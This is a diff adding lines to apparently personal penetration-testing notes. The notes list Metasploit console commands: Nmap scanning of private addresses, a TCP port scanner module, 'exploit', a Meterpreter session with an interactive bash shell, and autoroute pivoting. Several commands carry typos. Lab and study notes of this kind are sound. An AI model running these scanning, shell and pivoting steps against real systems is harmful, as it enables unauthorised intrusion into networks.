@@ -12,8 +12,39 @@ hosts
 
 services
 
+sessions
+
 wokspace -a Nmap_task
 
 db_nmap -Pn - sV -O 10.4.22.173
 
 vunls
+
+search portscan
+
+search udep_sweep
+
+use auxiliary/scanner/portscan/tcp
+
+show options
+
+set RHOST 192.168.1.5
+
+run
+
+curl 192.168.1.5
+
+exploit
+
+--Meterpreteer
+sysinfo
+
+shell
+
+/bin/bash -i
+
+ifconfig
+
+run autoroute -s 192.168.1.123
+
+background
